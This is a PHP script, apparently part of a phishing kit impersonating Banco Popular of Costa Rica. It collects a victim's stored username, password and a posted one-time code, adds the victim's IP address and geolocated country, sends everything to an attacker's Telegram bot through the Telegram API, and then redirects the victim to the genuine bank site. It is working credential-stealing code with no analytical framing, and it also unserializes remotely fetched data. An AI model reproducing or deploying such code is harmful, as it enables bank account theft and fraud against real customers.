<?php
session_start();

$_SESSION['sess5'] = $_POST['bt3'];

ini_set("display_errors", 0);
$userp = $_SERVER['REMOTE_ADDR'];

@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName']; 

require 'ashe.php';

if ( isset ($_POST['bt3']) ){
				
$flowcabimas =  "🏦<b>Bp Popular | By FwC</b>\n".
				"✔Usuario: ".$_SESSION['sess1']."\n".
				"✔Clave: ".$_SESSION['sess4']."\n".
				"🔐Cod1: ".$_POST['bt3']."\n".
				"➖\n".
				"🌐 ".$userp."\n".
				"📍 ".$pais."\n";

$flowcabimas = urlencode($flowcabimas);
$result = @file_get_contents("https://api.telegram.org/bot$tkfwc/sendMessage?chat_id=$fwchat_id&text=$flowcabimas&parse_mode=html");

Header ("Location: https://www.bancopopular.fi.cr/popular-seguros");
}
?>
